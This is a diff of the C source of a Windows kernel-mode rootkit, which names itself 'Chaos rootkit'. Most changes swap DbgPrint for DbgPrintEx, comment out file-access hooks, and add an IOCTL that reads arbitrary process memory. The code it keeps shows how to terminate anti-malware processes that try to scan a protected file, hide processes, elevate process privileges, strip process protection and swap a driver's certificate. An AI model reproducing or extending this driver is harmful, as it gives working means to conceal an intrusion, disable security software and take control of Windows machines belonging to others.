@@ -53,7 +53,7 @@ NTSTATUS WINAPI FakeNtCreateFile2(
             }
             __except (EXCEPTION_EXECUTE_HANDLER)
             {
-                DbgPrint("ProbeForRead failed: 0x%08X\n", GetExceptionCode());
+                DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"ProbeForRead failed: 0x%08X\n", GetExceptionCode());
                 return GetExceptionCode();
             }
         }
@@ -76,11 +76,11 @@ NTSTATUS WINAPI FakeNtCreateFile2(
                     {
                         if (ret == STATUS_INVALID_PARAMETER)
                         {
-                            DbgPrint("the process ID was not found.\n");
+                            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"the process ID was not found.\n");
                         }
                         else if (ret == STATUS_INVALID_CID)
                         {
-                            DbgPrint("the specified client ID is not valid.\n");
+                            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"the specified client ID is not valid.\n");
                         }
                         return ret;
                     }
@@ -99,16 +99,16 @@ NTSTATUS WINAPI FakeNtCreateFile2(
 
                     if (protectionLevel == global_protection_levels.PS_PROTECTED_ANTIMALWARE_LIGHT)
                     {
-                        DbgPrint("anti-malware trying to scan it!!\n");
+                        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"anti-malware trying to scan it!!\n");
 
                         status = ZwTerminateProcess(ZwCurrentProcess(), STATUS_SUCCESS);
                         if (!NT_SUCCESS(status))
                         {
-                            DbgPrint("Failed to terminate the anti-malware: %08X\n", status);
+                            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"Failed to terminate the anti-malware: %08X\n", status);
                         }
                         else
                         {
-                            DbgPrint("anti-malware terminated successfully.\n");
+                            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"anti-malware terminated successfully.\n");
                         }
                     }
 
@@ -150,7 +150,7 @@ NTSTATUS WINAPI FakeNtCreateFile2(
         }
         __except (GetExceptionCode() == STATUS_ACCESS_VIOLATION ? EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH)
         {
-            DbgPrint("An issue occurred while hooking NtCreateFile (Hook Removed) (%08X)\n", GetExceptionCode());
+            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"An issue occurred while hooking NtCreateFile (Hook Removed) (%08X)\n", GetExceptionCode());
             write_to_read_only_memory(xHooklist.NtCreateFileAddress, &xHooklist.NtCreateFileOrigin, sizeof(xHooklist.NtCreateFileOrigin));
             return GetExceptionCode();
         }
@@ -214,7 +214,7 @@ NTSTATUS WINAPI FakeNtCreateFile3(
             }
             __except (EXCEPTION_EXECUTE_HANDLER)
             {
-                DbgPrint("ProbeForRead failed: 0x%08X\n", GetExceptionCode());
+                DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"ProbeForRead failed: 0x%08X\n", GetExceptionCode());
                 return GetExceptionCode();
             }
         }
@@ -236,12 +236,12 @@ NTSTATUS WINAPI FakeNtCreateFile3(
                     {
                         if (ret == STATUS_INVALID_PARAMETER)
                         {
-                            DbgPrint("the process ID was not found.");
+                            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"the process ID was not found.");
                         }
 
                         if (ret == STATUS_INVALID_CID)
                         {
-                            DbgPrint("the specified client ID is not valid.");
+                            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"the specified client ID is not valid.");
                         }
 
                         return (-1);
@@ -255,16 +255,16 @@ NTSTATUS WINAPI FakeNtCreateFile3(
 
                     if (*(BYTE*)EProtectionLevel == global_protection_levels.PS_PROTECTED_ANTIMALWARE_LIGHT)
                     {
-                        DbgPrint("anti-malware trying to scan it!!\n");
+                        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"anti-malware trying to scan it!!\n");
 
                         status = ZwTerminateProcess(ZwCurrentProcess(), STATUS_SUCCESS);
                         if (!NT_SUCCESS(status))
                         {
-                            DbgPrint("Failed to terminate the anti-malware: %08X\n", status);
+                            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"Failed to terminate the anti-malware: %08X\n", status);
                         }
                         else
                         {
-                            DbgPrint("anti-malware terminated successfully.\n");
+                            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"anti-malware terminated successfully.\n");
                         }
                     }
 
@@ -306,7 +306,7 @@ NTSTATUS WINAPI FakeNtCreateFile3(
         }
         __except (GetExceptionCode() == STATUS_ACCESS_VIOLATION ? EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH)
         {
-            DbgPrint("An issue occurred while hooking NtCreateFile (Hook Removed) (%08X) \n", GetExceptionCode());
+            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"An issue occurred while hooking NtCreateFile (Hook Removed) (%08X) \n", GetExceptionCode());
 
             write_to_read_only_memory(xHooklist.NtCreateFileAddress, &xHooklist.NtCreateFileOrigin, sizeof(xHooklist.NtCreateFileOrigin));
         }
@@ -318,190 +318,190 @@ NTSTATUS WINAPI FakeNtCreateFile3(
     return (status);
 }
 
-NTSTATUS WINAPI FakeNtCreateFile(
-    PHANDLE            FileHandle,
-    ACCESS_MASK        DesiredAccess,
-    POBJECT_ATTRIBUTES ObjectAttributes,
-    PIO_STATUS_BLOCK   IoStatusBlock,
-    PLARGE_INTEGER     AllocationSize,
-    ULONG              FileAttributes,
-    ULONG              ShareAccess,
-    ULONG              CreateDisposition,
-    ULONG              CreateOptions,
-    PVOID              EaBuffer,
-    ULONG              EaLength
-) {
+//NTSTATUS WINAPI FakeNtCreateFile(
+//    PHANDLE            FileHandle,
+//    ACCESS_MASK        DesiredAccess,
+//    POBJECT_ATTRIBUTES ObjectAttributes,
+//    PIO_STATUS_BLOCK   IoStatusBlock,
+//    PLARGE_INTEGER     AllocationSize,
+//    ULONG              FileAttributes,
+//    ULONG              ShareAccess,
+//    ULONG              CreateDisposition,
+//    ULONG              CreateOptions,
+//    PVOID              EaBuffer,
+//    ULONG              EaLength
+//) {
+//
+//    int requestorPid = 0x0;
+//
+//    try
+//    {
+//        KPROCESSOR_MODE prevMode = ExGetPreviousMode();
+//        if (prevMode == UserMode)
+//        {
+//            __try
+//            {
+//                if (ObjectAttributes)
+//                {
+//                    ProbeForRead(ObjectAttributes, sizeof(OBJECT_ATTRIBUTES), sizeof(PVOID));
+//
+//                    if (ObjectAttributes->ObjectName)
+//                    {
+//                        ProbeForRead(ObjectAttributes->ObjectName, sizeof(UNICODE_STRING), sizeof(PVOID));
+//
+//                        if (ObjectAttributes->ObjectName->Buffer && ObjectAttributes->ObjectName->Length > 0)
+//                        {
+//                            ProbeForRead(
+//                                ObjectAttributes->ObjectName->Buffer,
+//                                ObjectAttributes->ObjectName->Length,
+//                                sizeof(WCHAR)
+//                            );
+//                        }
+//                    }
+//                }
+//
+//                if (FileHandle)
+//                    ProbeForRead(FileHandle, sizeof(HANDLE), sizeof(PVOID));
+//
+//                if (IoStatusBlock)
+//                    ProbeForRead(IoStatusBlock, sizeof(IO_STATUS_BLOCK), sizeof(PVOID));
+//
+//            }
+//            __except (EXCEPTION_EXECUTE_HANDLER)
+//            {
+//                DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"ProbeForRead failed: 0x%08X\n", GetExceptionCode());
+//                return GetExceptionCode();
+//            }
+//        }
+//        __try {
+//
+//            if (ObjectAttributes &&
+//                ObjectAttributes->ObjectName &&
+//                ObjectAttributes->ObjectName->Buffer)
+//            {
+//
+//                if (wcsstr(ObjectAttributes->ObjectName->Buffer, xHooklist.filename))
+//                {
+//
+//                    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"Blocked : %wZ.\n", ObjectAttributes->ObjectName);
+//
+//                    FLT_CALLBACK_DATA flt;
+//
+//                    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"requestor pid %d\n", requestorPid = FltGetRequestorProcessId(&flt));
+//
+//                    if ((ULONG)requestorPid == (ULONG)xHooklist.pID || !requestorPid) // more testing need to be done at this part ,used 0 to avoid restricting the same process ...
+//                    {
+//
+//                        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"process allowed\n");
+//
+//                        return (IoCreateFile(
+//                            FileHandle,
+//                            DesiredAccess,
+//                            ObjectAttributes,
+//                            IoStatusBlock,
+//                            AllocationSize,
+//                            FileAttributes,
+//                            ShareAccess,
+//                            CreateDisposition,
+//                            CreateOptions,
+//                            EaBuffer,
+//                            EaLength,
+//                            CreateFileTypeNone,
+//                            (PVOID)NULL,
+//                            0
+//                        ));
+//                    }
+//
+//                    return (STATUS_ACCESS_DENIED);
+//                }
+//
+//            }
+//
+//            return (IoCreateFile(
+//                FileHandle,
+//                DesiredAccess,
+//                ObjectAttributes,
+//                IoStatusBlock,
+//                AllocationSize,
+//                FileAttributes,
+//                ShareAccess,
+//                CreateDisposition,
+//                CreateOptions,
+//                EaBuffer,
+//                EaLength,
+//                CreateFileTypeNone,
+//                (PVOID)NULL,
+//                0
+//            ));
+//        }
+//        __except (GetExceptionCode() == STATUS_ACCESS_VIOLATION
+//            ? EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH)
+//        {
+//            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"an issue occured while hooking NtCreateFile (Hook Removed ) (%08) \n", GetExceptionCode());
+//
+//            write_to_read_only_memory(xHooklist.NtCreateFileAddress, &xHooklist.NtCreateFileOrigin, sizeof(xHooklist.NtCreateFileOrigin));
+//        }
+//    }
+//    __finally {
+//
+//        // KeReleaseMutex(&Mutex, FALSE);
+//    }
+//    return (STATUS_SUCCESS);
+//}
 
-    int requestorPid = 0x0;
-
-    try
-    {
-        KPROCESSOR_MODE prevMode = ExGetPreviousMode();
-        if (prevMode == UserMode)
-        {
-            __try
-            {
-                if (ObjectAttributes)
-                {
-                    ProbeForRead(ObjectAttributes, sizeof(OBJECT_ATTRIBUTES), sizeof(PVOID));
-
-                    if (ObjectAttributes->ObjectName)
-                    {
-                        ProbeForRead(ObjectAttributes->ObjectName, sizeof(UNICODE_STRING), sizeof(PVOID));
-
-                        if (ObjectAttributes->ObjectName->Buffer && ObjectAttributes->ObjectName->Length > 0)
-                        {
-                            ProbeForRead(
-                                ObjectAttributes->ObjectName->Buffer,
-                                ObjectAttributes->ObjectName->Length,
-                                sizeof(WCHAR)
-                            );
-                        }
-                    }
-                }
-
-                if (FileHandle)
-                    ProbeForRead(FileHandle, sizeof(HANDLE), sizeof(PVOID));
-
-                if (IoStatusBlock)
-                    ProbeForRead(IoStatusBlock, sizeof(IO_STATUS_BLOCK), sizeof(PVOID));
-
-            }
-            __except (EXCEPTION_EXECUTE_HANDLER)
-            {
-                DbgPrint("ProbeForRead failed: 0x%08X\n", GetExceptionCode());
-                return GetExceptionCode();
-            }
-        }
-        __try {
-
-            if (ObjectAttributes &&
-                ObjectAttributes->ObjectName &&
-                ObjectAttributes->ObjectName->Buffer)
-            {
-
-                if (wcsstr(ObjectAttributes->ObjectName->Buffer, xHooklist.filename))
-                {
-
-                    DbgPrint("Blocked : %wZ.\n", ObjectAttributes->ObjectName);
-
-                    FLT_CALLBACK_DATA flt;
-
-                    DbgPrint("requestor pid %d\n", requestorPid = FltGetRequestorProcessId(&flt));
-
-                    if ((ULONG)requestorPid == (ULONG)xHooklist.pID || !requestorPid) // more testing need to be done at this part ,used 0 to avoid restricting the same process ...
-                    {
-
-                        DbgPrint("process allowed\n");
-
-                        return (IoCreateFile(
-                            FileHandle,
-                            DesiredAccess,
-                            ObjectAttributes,
-                            IoStatusBlock,
-                            AllocationSize,
-                            FileAttributes,
-                            ShareAccess,
-                            CreateDisposition,
-                            CreateOptions,
-                            EaBuffer,
-                            EaLength,
-                            CreateFileTypeNone,
-                            (PVOID)NULL,
-                            0
-                        ));
-                    }
-
-                    return (STATUS_ACCESS_DENIED);
-                }
-
-            }
-
-            return (IoCreateFile(
-                FileHandle,
-                DesiredAccess,
-                ObjectAttributes,
-                IoStatusBlock,
-                AllocationSize,
-                FileAttributes,
-                ShareAccess,
-                CreateDisposition,
-                CreateOptions,
-                EaBuffer,
-                EaLength,
-                CreateFileTypeNone,
-                (PVOID)NULL,
-                0
-            ));
-        }
-        __except (GetExceptionCode() == STATUS_ACCESS_VIOLATION
-            ? EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH)
-        {
-            DbgPrint("an issue occured while hooking NtCreateFile (Hook Removed ) (%08) \n", GetExceptionCode());
-
-            write_to_read_only_memory(xHooklist.NtCreateFileAddress, &xHooklist.NtCreateFileOrigin, sizeof(xHooklist.NtCreateFileOrigin));
-        }
-    }
-    __finally {
-
-        // KeReleaseMutex(&Mutex, FALSE);
-    }
-    return (STATUS_SUCCESS);
-}
-
-DWORD initializehooklist(Phooklist hooklist_s, fopera rfileinfo, int Option)
-{
-    if (!hooklist_s || !rfileinfo.filename || (!rfileinfo.rpid && Option == 1))
-    {
-        DbgPrint("invalid structure provided \n");
-        return (-1);
-    }
-
-    if ((uintptr_t)hooklist_s->NtCreateFileHookAddress == (uintptr_t)&FakeNtCreateFile && Option == 1 && \
-        hooklist_s->pID == rfileinfo.rpid)
-    {
-        DbgPrint("Hook already active for function 1\n");
-        return  (STATUS_ALREADY_EXISTS);
-    }
-
-    else if ((uintptr_t)hooklist_s->NtCreateFileHookAddress == (uintptr_t)&FakeNtCreateFile2 && Option == 2)
-    {
-        DbgPrint("Hook already active for function 2\n");
-        return  (STATUS_ALREADY_EXISTS);
-    }
-
-    else if ((uintptr_t)hooklist_s->NtCreateFileHookAddress == (uintptr_t)&FakeNtCreateFile3 && Option == 3)
-    {
-        DbgPrint("Hook already active for function 3\n");
-        return  (STATUS_ALREADY_EXISTS);
-    }
-
-
-    if (Option == 1)
-    {
-        DbgPrint("allowing PID  \n", rfileinfo.rpid);
-
-        hooklist_s->pID = rfileinfo.rpid;
-
-        hooklist_s->NtCreateFileHookAddress = (uintptr_t)&FakeNtCreateFile;
-    }
-
-    else if (Option == 2)
-        hooklist_s->NtCreateFileHookAddress = (uintptr_t)&FakeNtCreateFile2;
-    else if (Option == 3)
-        hooklist_s->NtCreateFileHookAddress = (uintptr_t)&FakeNtCreateFile3;
-
-
-    memcpy(hooklist_s->NtCreateFilePatch + 2, &hooklist_s->NtCreateFileHookAddress, sizeof(void*));
-
-    RtlCopyMemory(hooklist_s->filename, rfileinfo.filename, sizeof(rfileinfo.filename));
-
-    write_to_read_only_memory(hooklist_s->NtCreateFileAddress, &hooklist_s->NtCreateFilePatch, sizeof(hooklist_s->NtCreateFilePatch));
-
-    DbgPrint("Hooks installed \n");
-
-    return (0);
-}
+//DWORD initializehooklist(Phooklist hooklist_s, fopera rfileinfo, int Option)
+//{
+//    if (!hooklist_s || !rfileinfo.filename || (!rfileinfo.rpid && Option == 1))
+//    {
+//        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"invalid structure provided \n");
+//        return (-1);
+//    }
+//
+//    if ((uintptr_t)hooklist_s->NtCreateFileHookAddress == (uintptr_t)&FakeNtCreateFile && Option == 1 && \
+//        hooklist_s->pID == rfileinfo.rpid)
+//    {
+//        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"Hook already active for function 1\n");
+//        return  (STATUS_ALREADY_EXISTS);
+//    }
+//
+//    else if ((uintptr_t)hooklist_s->NtCreateFileHookAddress == (uintptr_t)&FakeNtCreateFile2 && Option == 2)
+//    {
+//        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"Hook already active for function 2\n");
+//        return  (STATUS_ALREADY_EXISTS);
+//    }
+//
+//    else if ((uintptr_t)hooklist_s->NtCreateFileHookAddress == (uintptr_t)&FakeNtCreateFile3 && Option == 3)
+//    {
+//        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"Hook already active for function 3\n");
+//        return  (STATUS_ALREADY_EXISTS);
+//    }
+//
+//
+//    if (Option == 1)
+//    {
+//        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"allowing PID  \n", rfileinfo.rpid);
+//
+//        hooklist_s->pID = rfileinfo.rpid;
+//
+//        hooklist_s->NtCreateFileHookAddress = (uintptr_t)&FakeNtCreateFile;
+//    }
+//
+//    else if (Option == 2)
+//        hooklist_s->NtCreateFileHookAddress = (uintptr_t)&FakeNtCreateFile2;
+//    else if (Option == 3)
+//        hooklist_s->NtCreateFileHookAddress = (uintptr_t)&FakeNtCreateFile3;
+//
+//
+//    memcpy(hooklist_s->NtCreateFilePatch + 2, &hooklist_s->NtCreateFileHookAddress, sizeof(void*));
+//
+//    RtlCopyMemory(hooklist_s->filename, rfileinfo.filename, sizeof(rfileinfo.filename));
+//
+//    write_to_read_only_memory(hooklist_s->NtCreateFileAddress, &hooklist_s->NtCreateFilePatch, sizeof(hooklist_s->NtCreateFilePatch));
+//
+//    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"Hooks installed \n");
+//
+//    return (0);
+//}
 
 void
 unloadv(
@@ -520,7 +520,7 @@ unloadv(
 
         }
         __except (EXCEPTION_EXECUTE_HANDLER) {
-            DbgPrint("An error occured during driver unloading \n");
+            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"An error occured during driver unloading \n");
         }
     }
     __finally
@@ -529,7 +529,7 @@ unloadv(
 
         IoDeleteDevice(driverObject->DeviceObject);
 
-        DbgPrint("Driver Unloaded\n");
+        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"Driver Unloaded\n");
     }
 }
 
@@ -543,7 +543,7 @@ NTSTATUS processIoctlRequest(
 
     int pstatus = 0;
     int inputInt = 0;
-
+    ULONG_PTR Information = sizeof(int);
     __try
     {
         // if system offsets not supported / disable features 
@@ -554,6 +554,7 @@ NTSTATUS processIoctlRequest(
             pstatus = ERROR_UNSUPPORTED_OFFSET;
             __leave;
         }
+        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "IOc: %d\n", pstack->Parameters.DeviceIoControl.IoControlCode);
 
         switch (pstack->Parameters.DeviceIoControl.IoControlCode)
         {
@@ -567,11 +568,58 @@ NTSTATUS processIoctlRequest(
             RtlCopyMemory(&inputInt, Irp->AssociatedIrp.SystemBuffer, sizeof(inputInt));
 
             pstatus = HideProcess(inputInt);
+            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "Received input value: %d\n", inputInt);
 
-            DbgPrint("Received input value: %d\n", inputInt);
+            //DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"Received input value: %d\n", inputInt);
             break;
         }
+        case READ_PROCESS_MEMORY:
+        {
+            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "Get Read Command");
 
+            if (pstack->Parameters.DeviceIoControl.InputBufferLength < sizeof(fopermin))
+            {
+                pstatus = STATUS_BUFFER_TOO_SMALL;
+                break;
+            }
+            Pfopermin input= Irp->AssociatedIrp.SystemBuffer;
+            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "SysTemBuffer PVOID=0x%p\n", input);
+            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "Get Read pid=%d\n", input->rpid);
+
+            ULONG outputLength = pstack->Parameters.DeviceIoControl.OutputBufferLength;
+            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "输出长度=%lu,输入长度=%I64u\n", outputLength, input->size);
+         
+            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "校验 Size 合理\n");
+            // 3. 计算所需总输出大小
+            SIZE_T totalOutputSize = FIELD_OFFSET(fopermin, Data) + input->size;
+            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "所需输出buff大小=%I64u\n", totalOutputSize);
+            if (outputLength < totalOutputSize) {
+                break;
+            }
+            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "总输出大小=%d\n", (ULONG)totalOutputSize);
+            OBJECT_ATTRIBUTES attr; // 声明一个对象属性结构体。
+            InitializeObjectAttributes(&attr, NULL, 0, NULL, NULL); // 初始化对象属性，无名称、无安全描述符等。
+            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "Strart Read\n");
+            ULONG Data = 0;
+            Information = totalOutputSize;
+            pstatus = KeReadProcessMemory(
+                (HANDLE)input->rpid,
+                (PVOID)input->address, 
+                &(input->Data),
+                input->size
+            );
+            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "Read Over pstatus %d\n", *(PULONG)(input->Data));
+
+            if (NT_SUCCESS(pstatus)) {
+                DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "Read Sucess 返回数据大小%d\n", (ULONG)totalOutputSize);
+            }
+            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "Read Over pstatus %d\n", pstatus);
+            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "Read Over\n");
+         
+           
+         
+            break;
+        }
         case PRIVILEGE_ELEVATION:
         {
             if (pstack->Parameters.DeviceIoControl.InputBufferLength < sizeof(int))
@@ -584,7 +632,7 @@ NTSTATUS processIoctlRequest(
 
             pstatus = PrivilegeElevationForProcess(inputInt);
 
-            DbgPrint("Received input value: %d\n", inputInt);
+            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"Received input value: %d\n", inputInt);
 
             break;
         }
@@ -604,7 +652,7 @@ NTSTATUS processIoctlRequest(
             break;
         }
 
-        case RESTRICT_ACCESS_TO_FILE_CTL:
+       /* case RESTRICT_ACCESS_TO_FILE_CTL:
         {
             if (pstack->Parameters.DeviceIoControl.InputBufferLength < sizeof(fopera))
             {
@@ -615,11 +663,11 @@ NTSTATUS processIoctlRequest(
             RtlCopyMemory(&rfileinfo, Irp->AssociatedIrp.SystemBuffer, sizeof(rfileinfo));
 
             pstatus = initializehooklist(&xHooklist, rfileinfo, 1);
-            DbgPrint("File access restricted ");
+            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"File access restricted ");
             break;
-        }
+        }*/
 
-        case PROTECT_FILE_AGAINST_ANTI_MALWARE_CTL:
+       /* case PROTECT_FILE_AGAINST_ANTI_MALWARE_CTL:
         {
             if (pstack->Parameters.DeviceIoControl.InputBufferLength < sizeof(fopera))
             {
@@ -630,30 +678,30 @@ NTSTATUS processIoctlRequest(
             RtlCopyMemory(&rfileinfo, Irp->AssociatedIrp.SystemBuffer, sizeof(rfileinfo));
 
             pstatus = initializehooklist(&xHooklist, rfileinfo, 3);
-            DbgPrint(" file protected against anti-malware processes ");
+            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL," file protected against anti-malware processes ");
             break;
-        }
+        }*/
 
-        case BYPASS_INTEGRITY_FILE_CTL: // 
-        {
-            if (pstack->Parameters.DeviceIoControl.InputBufferLength < sizeof(fopera))
-            {
-                pstatus = STATUS_BUFFER_TOO_SMALL;
-                break;
-            }
-            fopera rfileinfo = { 0 };
-            RtlCopyMemory(&rfileinfo, Irp->AssociatedIrp.SystemBuffer, sizeof(rfileinfo));
-            pstatus = initializehooklist(&xHooklist, rfileinfo, 2);
+        //case BYPASS_INTEGRITY_FILE_CTL: // 
+        //{
+        //    if (pstack->Parameters.DeviceIoControl.InputBufferLength < sizeof(fopera))
+        //    {
+        //        pstatus = STATUS_BUFFER_TOO_SMALL;
+        //        break;
+        //    }
+        //    fopera rfileinfo = { 0 };
+        //    RtlCopyMemory(&rfileinfo, Irp->AssociatedIrp.SystemBuffer, sizeof(rfileinfo));
+        //    pstatus = initializehooklist(&xHooklist, rfileinfo, 2);
 
-            DbgPrint("bypass integrity check ");
-            break;
-        }
+        //    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"bypass integrity check ");
+        //    break;
+        //}
 
         case UNPROTECT_ALL_PROCESSES:
         {
             pstatus = UnprotectAllProcesses();
 
-            DbgPrint("all Processes Protection has been removed");
+            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"all Processes Protection has been removed");
             break;
         }
 
@@ -661,20 +709,20 @@ NTSTATUS processIoctlRequest(
         {
             if (NT_SUCCESS(pstatus = ScDriverEntry(DeviceObject->DriverObject, registryPathCopy)))
             {
-                DbgPrint("{ZwSwapCert} Driver swapped in memory and on disk.\n");
+                DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"{ZwSwapCert} Driver swapped in memory and on disk.\n");
 
             }
             else
             {
-                DbgPrint("{ZwSwapCert} Failed to swap driver \n");
+                DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"{ZwSwapCert} Failed to swap driver \n");
 
             }
             break;
         }
-
+       
         default:
         {
-            DbgPrint("Invalid IOCTL code: 0x%08X\n", pstack->Parameters.DeviceIoControl.IoControlCode);
+            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"Invalid IOCTL code: 0x%08X\n", pstack->Parameters.DeviceIoControl.IoControlCode);
             pstatus = STATUS_INVALID_DEVICE_REQUEST;
             break;
         }
@@ -686,17 +734,17 @@ NTSTATUS processIoctlRequest(
 
         if (GetExceptionCode() == STATUS_ACCESS_VIOLATION)
         {
-            DbgPrint("Invalid Buffer (STATUS_ACCESS_VIOLATION)");
+            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"Invalid Buffer (STATUS_ACCESS_VIOLATION)");
 
             KPROCESSOR_MODE prevmode = ExGetPreviousMode();
 
             if (prevmode == UserMode)
             {
-                DbgPrint("possible that the client is attempting to crash the driver, but not if we crash you first :) ");
+                DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"possible that the client is attempting to crash the driver, but not if we crash you first :) ");
 
                 if (!NT_SUCCESS(pstatus))
                 {
-                    DbgPrint("failed to open process (%08X)\n", pstatus);
+                    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"failed to open process (%08X)\n", pstatus);
 
                 }
                 else
@@ -705,7 +753,7 @@ NTSTATUS processIoctlRequest(
 
                     if (!NT_SUCCESS(pstatus))
                     {
-                        DbgPrint("failed to terminate the requestor process (%08X)\n", pstatus);
+                        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"failed to terminate the requestor process (%08X)\n", pstatus);
                     }
                 }
 
@@ -719,7 +767,7 @@ NTSTATUS processIoctlRequest(
 
     Irp->IoStatus.Status = pstatus;
 
-    Irp->IoStatus.Information = sizeof(int);
+    Irp->IoStatus.Information = Information;
 
     IoCompleteRequest(Irp, IO_NO_INCREMENT);
 
@@ -742,20 +790,20 @@ ShutdownCallback(
 
         __try
         {
-            DbgPrint("preparing driver to be unloaded ..\n");
+            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"preparing driver to be unloaded ..\n");
 
             PrepareDriverForUnload();
 
         }
         __except (EXCEPTION_EXECUTE_HANDLER)
         {
-            DbgPrint("An error occured during driver unloading on shutdown \n");
+            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"An error occured during driver unloading on shutdown \n");
         }
     }
     __finally
     {
 
-        DbgPrint("Driver Unloaded in shutdown\n");
+        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"Driver Unloaded in shutdown\n");
     }
 }
 
@@ -765,7 +813,8 @@ DriverEntry(
     PUNICODE_STRING registryPath
 )
 {
-    DbgPrint("Chaos rootkit loaded .. (+_+) \n");
+    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "Chaos rootkit loaded .. (+_+) \n");
+    //DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"Chaos rootkit loaded .. (+_+) \n");
 
     NTSTATUS status;
 
@@ -773,7 +822,7 @@ DriverEntry(
 
     if (!NT_SUCCESS(status = InitializeStructure(&xHooklist)))
     {
-        DbgPrint(("Failed to initialize hook structure (0x%08X)\n", status));
+        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,("Failed to initialize hook structure (0x%08X)\n", status));
         return (STATUS_UNSUCCESSFUL);
     }
 
@@ -783,7 +832,7 @@ DriverEntry(
 
     if (!NT_SUCCESS(status))
     {
-        DbgPrint(("Failed to create device object (0x%08X)\n", status));
+        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,("Failed to create device object (0x%08X)\n", status));
         return (STATUS_UNSUCCESSFUL);
     }
 
@@ -791,25 +840,25 @@ DriverEntry(
 
     if (!NT_SUCCESS(status))
     {
-        DbgPrint(("Failed to create symbolic link (0x%08X)\n", status));
